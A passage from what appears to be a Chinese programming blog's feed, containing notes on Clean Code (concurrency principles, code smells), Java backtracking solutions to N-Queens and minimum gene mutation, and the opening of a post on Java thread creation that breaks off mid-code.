title="十三、并发编程"></a>十三、并发编程</h2><p>A.为什么要并发</p><p>1.并发是一种解耦策略，它帮助我们把做什么（目的）和何时（时机）做分解开</p><p>2.解耦目的与时机能明显地改进应用程序的吞吐量和结构</p><p>3.单线程程序许多时间花在等待web套接字I&#x2F;O结束上面，通过采用同时访问多个站点的多线程算法，就能改进性能</p><p>4.常见的迷思和误解</p><ul><li><p>并发总能改进性能：只在多个线程或处理器之间能分享大量等待时间的时候管用</p></li><li><p>编写并发程序无需修改设计：可能与单线程系统的设计极不相同</p></li><li><p>在采用web或ejb容器时，理解并发问题并不重要<br>5.有关编写并发软件的中肯的说法：</p></li><li><p>并发会在性能和编写额外代码上增加一些开销</p></li><li><p>正确的并发是复杂的，即使对于简单的问题也是如此</p></li><li><p>并发缺陷并非总能重现，所以常被看做偶发事件而忽略，未被当做真的缺陷看待</p></li><li><p>并发常常需要对设计策略的根本性修改</p></li></ul><p>B.挑战<br>1.线程在执行代码时有许多可能路径可行，有些路径会产生错误的结果</p><p>C.并发防御原则</p><p>1.单一权责原则（SRP）：方法&#x2F;类&#x2F;组件应当只有一个修改的理由</p><ul><li><p>并发相关代码有自己的开发、修改和调优生命周期</p></li><li><p>开发相关代码有自己要对付的挑战，和非并发相关代码不同</p></li><li><p>即使没有周边应用程序增加的负担，写得不好的并发代码可能的出错方式数量也已经足具有挑战性</p></li><li><p>建议：分离并发相关代码与其他代码<br>2.推论：限制数据作用域</p></li><li><p>采用synchronized关键字在代码中保护一块使用共享对象的临界区（critical section）</p></li><li><p>建议：谨记数据封闭；严格限制对可能被共享的数据的访问<br>3.推论：使用数据复本</p></li><li><p>一开始就避免共享数据，复制对象并以只读方式对待，或复制对象，从多个线程收集所有复本的结果，并在单个线程中合并这些结果<br>4.推论：线程应尽可能地独立</p></li><li><p>让每个线程在自己的世界中存在，不与其他线程共享数据</p></li><li><p>建议：尝试将数据分解到可被独立线程（可能在不同处理器上）操作的独立子集</p></li></ul><p>D.了解Java库</p><p>1.要注意：</p><ul><li>使用类库提供的线程安全群集</li><li>使用executor框架（executor framework）执行无关任务</li><li>尽可能使用非锁定解决方案</li><li>有几个类并不是线程安全的</li></ul><p>E.了解执行模型</p><p>1.一些基础定义</p><ul><li>限定资源：并发环境中有着固定尺寸或数量的资源</li><li>互斥：每一时刻仅有一个线程能访问共享数据或共享资源</li><li>线程饥饿：一个或一组线程在很长时间内或永久被禁止</li><li>死锁：两个或多个线程互相等待执行结束。每个线程都拥有其他线程需要的资源，行不到其他线程拥有的资源，就无法终止</li><li>活锁：执行次序一致的线程，每个都想要起步，但发现其他线程已经“在路上”。由于竞步的原因，线程会持续尝试起步，但在很长时间内却无法如愿，甚至永远无法启动<br>2.生产者-消费者模型：一个或多个生产者线程创建某些工作，并置于缓存或队列中。一个或多个消费者线程从队列中获取并完成这些工作。生产者消费者之间的队列是一种限定资源<br>3.读者-作者模型：协调读者线程，不去读作者线程正在更新的信息（反之亦然），这是一种辛苦的平衡工作，作者线程倾向于长期锁定许多读者纯种，从而导致吞吐量问题<br>4.宴席哲学家<br>5.建议学习这些基础算法，理解其解决方案</li></ul><p>F.警惕同步方法之间的依赖<br>1.同步方法之间的依赖会导致并发代码中的狡猾缺陷，建议避免使用一个共享对象的多个方法<br>2.基于客户端的锁定：客户端代码在调用第一个方法前锁定服务端，确保锁的范围覆盖了调用最后一个方法的代码<br>3.基于服务端的锁定：在服务端内创建锁定服务端的方法，调用所有方法，然后解锁。让客户端代码调用新方法<br>4.适配服务端：创建执行锁定的中间层。这是一种基于服务端的锁定的例子，但不修改原始服务端代码</p><p>G.保持同步区域微小<br>1.同一个锁维护的所有代码区域在任一时刻保证只有一个线程执行，因为它们带来了延迟和额外开销，临界区应该被保护起来，应该尽可能少地设计临界区</p><p>H.很维编写正确的关闭代码<br>1.平静关闭很难做到，常见问题与死锁有关，线程一直等待永远不会到来的信号<br>2.建议：尽早考虑关闭问题，尽早令其工作正常</p><p>I.测试线程代码<br>1.建议：编写有潜力曝露问题的测试，在不同的编程配置、系统配置和负载条件下频繁运行。如果测试失败，跟踪错误。别因为后来测试通过了后来的运行就忽略失败<br>2.将伪失败看作可能的线程问题：线程代码导致“不可能失败的”失败，不要将系统错误归咎于偶发事件<br>3.先使非线程代码可工作：不要同时追踪非线程缺陷和线程缺陷，确保代码在线程之外可工作<br>4.编写可插拔的线程代码，能在不同的配置环境下运行<br>5.编写可调整的线程代码：允许线程依据吞吐量和系统使用率自我调整<br>6.运行多于处理器数量的线程：任务交换越频繁，越有可能找到错过临界区域导致死锁的代码<br>7.在不同平台上运行：尽早并经常地在所有目标平台上运行线程代码<br>8.装置试错代码：增加对Object.wait()、Object.sleep()、Object.yield()、Object.priority()等方法的调用，改变代码执行顺序，硬编码或自动化</p><h2 id="十四、逐步改进"><a href="#十四、逐步改进" class="headerlink" title="十四、逐步改进"></a>十四、逐步改进</h2><p>1.要编写清洁代码，必须先写肮脏代码，然后再清理它<br>2.毁坏程序的最好方法之一就是以改进之名大动其结构</p><h2 id="十五、JUnit内幕"><a href="#十五、JUnit内幕" class="headerlink" title="十五、JUnit内幕"></a>十五、JUnit内幕</h2><h2 id="十六、重构SerialDate"><a href="#十六、重构SerialDate" class="headerlink" title="十六、重构SerialDate"></a>十六、重构SerialDate</h2><h2 id="十七、味道与启发"><a href="#十七、味道与启发" class="headerlink" title="十七、味道与启发"></a>十七、味道与启发</h2><p>A.注释<br>1.不恰当的信息：注释只应该描述有关代码和设计的技术性信息<br>2.废弃的注释<br>3.冗余的注释<br>4.糟糕的注释：别闲扯，别画蛇添足，保持简洁<br>5.注释掉的代码：删除它</p><p>B.环境<br>1.需要多步才能实现的构建：构建系统应该是单步的小操作<br>2.需要多步才能做到的测试：应当能够发出单个指令就可以运行全部单元测试</p><p>C.函数<br>1.过多的参数：参数量应该少，三个以上的参数非常值得质疑<br>2.输出参数：输出参数违反直觉，直接修改它所有对象的状态<br>3.标识参数：布尔值参数大声宣告函数做了不止一件事，应该消灭掉<br>4.死函数：永不被调用的方法应该丢弃</p><p>D.一般性问题：<br>1.一个源文件中存在多种语言：尽力减少源文件中额外语言的数量和范围<br>2.明显的行为未被实现：遵循“最小惊异原则”（The principle of Least Surprise），函数或类应该实现其他程序员有理由期待的行为<br>3.不正确的边界行为：别依赖直觉，追索每种边界条件，并编写测试<br>4.忽视安全<br>5.重复：看到重复代码，都代表遗漏了抽象<br>6.在错误的抽象层级上的代码：创建分离较高层级一般性概念（抽象类）与较低层级细节概念（派生类）的抽象模型<br>7.基类依赖于派生类：基类对派生类应该一无所知<br>8.信息过多：设计良好的模块有着非常小的接口，限制类或模块中暴露的接口数量，类中的方法越少越好，隐藏你的数据，隐藏你的工具函数，隐藏常量和临时变量<br>9.死代码：删除掉<br>10.垂直分隔：变量和函数应该在靠近被使用的地方定义，垂直距离要短<br>11.前后不一致：从一而终，可以追溯到最小惊异原则，让代码更加易于阅读和修改<br>12.混淆视听：保持源文件整洁，良好地组织，不被搞乱<br>13.人为耦合：不互相依赖的东西不该耦合<br>14.特性依恋：类的方法只应对其所属类中的变量和函数感兴趣，不该垂青其他类中的变量和函数<br>15.选择算子参数：使用多个函数，通常优于向单个函数传递某些代码来选择函数行为<br>16.晦涩的意图：代码要尽可能具有表达力<br>17.位置错误的权责：代码应该放在读者自然而然期待它所有的地方<br>18.不恰当的静态方法：如果的确需要静态函数，确保没机会打算让它有多态行为<br>19.使用解释性变量：让程序可读的最有力方法之一就是将计算过程打散成用有意义的单词命名的变量中放置的中间值<br>20.函数名称应该表达其行为<br>21.理解算法：在你认为自己完成某个函数之前，确认自己理解了它是怎么工作的，你必须知道解决方案是正确的<br>22.把逻辑依赖改为物理依赖：依赖模块不应对被依赖者模块有假定，它应当明确地询问后者全部信息<br>23.用多态替代if&#x2F;Else或Switch&#x2F;Case，“单个switch”规则：对于给定的选择类型，不应有多于一个switch语句<br>24.遵循标准约定，遵循基于通用行业规范的一套编码标准<br>25.用命名常量替代魔术数，在代码中出现原始形态数字通常来说是坏现象，有些常量与非常具有自我解释能力的代码协同工作时，就不必总是需要命名常量来隐藏了。“魔术数”泛指任何不能自我描述的符号<br>26.准确，在代码中做决定时，确认自己足够准确，明确自己为何要这么做，如果遇到异常情况如何处理<br>27.结构甚于约定<br>28.封装条件，如果没有if或while语句的上下文，布尔逻辑就难以理解，应该把解释了条件意图的函数抽离出来<br>29.避免否定性条件，尽可能将条件表示为肯定形式<br>30.函数只该做一件事<br>31.掩蔽时序耦合，排列函数参数，好让它们被调用的次序显而易见<br>32.别随意，构建代码需要理由，而且理由应与代码结构相契合<br>33.封装边界条件，把处理边界条件的代码集中到一处，不要散落于代码中<br>34.函数应该只在一个抽象层级上，函数中的语句应该在同一抽象层级上，该层级应该是函数名所示操作的下一层<br>35.在较高层级放置可配置数据，如果你有个已知并该在较高抽象层级的默认常量或配置值，不要将它埋藏到较低层级的函数中<br>36.避免传递浏览，让直接协作者提供所需的全部服务，不必逛遍系统的对象全图，搜寻我们要调用的方法</p><p>E.Java<br>1.通过使用通配符避免过长的导入清单<br>2.不要继承常量，应该直接导入常量类<br>3.常量 vs. 枚举，放心使用枚举</p><p>F.名称<br>1.采用描述性名称，事物的意义随着软件的演化而变化，要经常性地重新估量名称是否恰当<br>2.名称应与抽象层级相符，不要取沟通实现的名称；取反映类或函数抽象层级的名称<br>3.尽可能使用标准命名法<br>4.无歧义的名称，选用不会混淆函数或变量意义的名称<br>5.为较大作用范围选用较长名称<br>6.避免编码，不要用匈牙利命名法污染你的名称<br>7.名称应该说明副作用</p><p>G.测试</p><p>1.测试不足，一套测试应该测到所有可能失败的东西</p><p>2.使用覆盖率工具，能汇报你测试策略中的缺口</p><p>3.别略过小测试</p><p>4.被忽略的测试就是对不确定事物的疑问</p><p>5.测试边界条件</p><p>6.全面测试相近的缺陷</p><p>7.测试失败的模式有启发性，完整的测试用例，按合理的顺序排列，能暴露出模式</p><p>8.测试覆盖率的模式有启发性</p><p>9.测试应该快速</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回溯算法</title>
    <link href="/2023/06/18/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"/>
    <url>/2023/06/18/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>算法分析课程讲到的算法，发现自己之前刷题的时候有接触过，一般是和深度优先DFS一起出现。由于是全局搜索，复杂度会较高。</p><p>回溯法（back tracking）（探索与回溯法）是一种选优搜索法，又称为试探法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回到上一步，重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。</p><p>回溯算法模板框架如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(参数)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (终止条件) &#123;</span><br><span class="line">        存放结果;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) &#123;</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); <span class="comment">// 递归</span></span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面通过几个回溯算法的问题来学习如何使用该算法思想</p><h2 id="N皇后问题"><a href="#N皇后问题" class="headerlink" title="N皇后问题"></a>N皇后问题</h2><p>n 皇后问题 研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><p>给你一个整数 n ，返回所有不同的 n 皇后问题 的解决方案。</p><p>每一种解法包含一个不同的 n 皇后问题 的棋子放置方案，该方案中 ‘Q’ 和 ‘.’ 分别代表了皇后和空位。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这里是从第一行开始，在第一行中选一个作为皇后，接着再到第二行、第三行选皇后的位置，所以每个皇后一定不同行<br>还需要判断的是不同列，不同斜线。列可以直接检查该列是否有无皇后，而斜线要在该点行列分别加1或者减1判断是否有无皇后。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">solveNQueens</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[][] chessboard = <span class="keyword">new</span> <span class="title class_">char</span>[n][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span>[] c : chessboard) &#123;</span><br><span class="line">            Arrays.fill(c, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        backTrack(n, <span class="number">0</span>, chessboard);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backTrack</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> row, <span class="type">char</span>[][] chessboard)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (row == n) &#123;</span><br><span class="line">            res.add(Array2List(chessboard));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> <span class="number">0</span>;col &lt; n; ++col) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isValid (row, col, n, chessboard)) &#123;</span><br><span class="line">                chessboard[row][col] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">                backTrack(n, row+<span class="number">1</span>, chessboard);</span><br><span class="line">                chessboard[row][col] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">Array2List</span><span class="params">(<span class="type">char</span>[][] chessboard)</span> &#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span>[] c : chessboard) &#123;</span><br><span class="line">            list.add(String.copyValueOf(c));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> col, <span class="type">int</span> n, <span class="type">char</span>[][] chessboard)</span> &#123;</span><br><span class="line">        <span class="comment">// 检查列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;row; ++i) &#123; <span class="comment">// 相当于剪枝</span></span><br><span class="line">            <span class="keyword">if</span> (chessboard[i][col] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查45度对角线</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=row-<span class="number">1</span>, j=col-<span class="number">1</span>; i&gt;=<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>; i--, j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chessboard[i][j] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查135度对角线</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=row-<span class="number">1</span>, j=col+<span class="number">1</span>; i&gt;=<span class="number">0</span> &amp;&amp; j&lt;=n-<span class="number">1</span>; i--, j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chessboard[i][j] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样用到回溯算法的还有前两天刷到的力扣的每日一题，该题也能使用回溯的思想</p><h2 id="最小基因变化"><a href="#最小基因变化" class="headerlink" title="最小基因变化"></a>最小基因变化</h2><p>基因序列可以表示为一条由 8 个字符组成的字符串，其中每个字符都是 ‘A’、’C’、’G’ 和 ‘T’ 之一。</p><p>假设我们需要调查从基因序列 start 变为 end 所发生的基因变化。一次基因变化就意味着这个基因序列中的一个字符发生了变化。</p><p>例如，”AACCGGTT” –&gt; “AACCGGTA” 就是一次基因变化。<br>另有一个基因库 bank 记录了所有有效的基因变化，只有基因库中的基因才是有效的基因序列。</p><p>给你两个基因序列 start 和 end ，以及一个基因库 bank ，请你找出并返回能够使 start 变化为 end 所需的最少变化次数。如果无法完成此基因变化，返回 -1 。</p><p>注意：起始基因序列 start 默认是有效的，但是它并不一定会出现在基因库中。</p><p>示例 1：<br>输入：start &#x3D; “AACCGGTT”, end &#x3D; “AACCGGTA”, bank &#x3D; [“AACCGGTA”]<br>输出：1</p><p>示例 2：<br>输入：start &#x3D; “AACCGGTT”, end &#x3D; “AAACGGTA”, bank &#x3D; [“AACCGGTA”,”AACCGCTA”,”AAACGGTA”]<br>输出：2</p><p>示例 3：<br>输入：start &#x3D; “AAAAACCC”, end &#x3D; “AACCCCCC”, bank &#x3D; [“AAAACCCC”,”AAACCCCC”,”AACCCCCC”]<br>输出：3</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">minSteps</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; pathSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minMutation</span><span class="params">(String start, String end, String[] bank)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start.equals(end)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">// bank 基因库中是否存在 end 基因序列</span></span><br><span class="line">        <span class="keyword">for</span> (String str : bank) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str.equals(end)) &#123;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag) &#123; <span class="comment">// bank 基因库中不存在 end 基因 无法完成基因变化直接返回-1</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 暴力回溯穷举所有基因变化的步数 记录并返回最小值</span></span><br><span class="line">        backtracking(start, end, bank, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> minSteps == Integer.MAX_VALUE ? -<span class="number">1</span> : minSteps;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String start, String end, String[] bank, <span class="type">int</span> steps)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start.equals(end)) &#123;  <span class="comment">// 递归结束：更新最小步数并结束当前递归（一条符合基因变化的路径到了叶结点</span></span><br><span class="line">            minSteps = Math.min(steps, minSteps);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String str : bank) &#123;  <span class="comment">// for循环扩展树的广度 每一层代表从一个基因序列开始变换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">diffNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123; </span><br><span class="line">                <span class="keyword">if</span> (str.charAt(i) != start.charAt(i)) &#123;</span><br><span class="line">                    diffNum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 剪枝：判断当前bank中的基因是否可以由start基因变化而来</span></span><br><span class="line">            <span class="comment">// 从 start 到 str 不是有效的基因变化 || 之前的基因变化序列中已经用过了 str</span></span><br><span class="line">            <span class="comment">// 那么 bank 中当前基因是不能加入基因变化路径的 当前层直接尝试下一个基因</span></span><br><span class="line">            <span class="keyword">if</span> (diffNum != <span class="number">1</span> || pathSet.contains(str)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pathSet.add(str);</span><br><span class="line">            steps++;</span><br><span class="line">            backtracking(str, end, bank, steps); <span class="comment">// 扩展树的深度 递归进行下一次基因变化</span></span><br><span class="line">            steps--;</span><br><span class="line">            pathSet.remove(str); <span class="comment">// 回溯撤销下一层的影响 回到本层尝试bank中的其他基因</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>回溯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>并发框架（JUC）</title>
    <link href="/2023/06/18/%E5%B9%B6%E5%8F%91%E6%A1%86%E6%9E%B6%EF%BC%88JUC%EF%BC%89/"/>
    <url>/2023/06/18/%E5%B9%B6%E5%8F%91%E6%A1%86%E6%9E%B6%EF%BC%88JUC%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程基础"><a href="#多线程基础" class="headerlink" title="多线程基础"></a>多线程基础</h1><p>并发框架，其实也叫 JUC 即 java.util.concurrent 包，分为（锁框架、原子类框架、同步器框架、集合框架、执行器框架）</p><h2 id="线程创建方式"><a href="#线程创建方式" class="headerlink" title="线程创建方式"></a>线程创建方式</h2><ul><li>继承Thread类重写run方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Thread1</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在run方法中实现业务代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;我是子线程&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;我是主线程&quot;</span>);</span><br><span class="line">        <span class="comment">//不能直接使用run()方法，这就不属于开启线程，而是调用一个方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread1</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>实现Runnable接口<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Thread2</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在run方法中实现业务代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;我是子线程&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;我是主线程&quot;</span>);</span><br><span class="line">        <span class="comment">//这里要通过new Thread()的方式来开启</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Thread2</span>()).start();</span><br><span class="line">        <span class="comment">//简化版 lambdas</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; System.out.println(Thread.currentThread().getName() + <span class="string">&quot;我是子线程&quot;</span>)).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>继承Callable</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 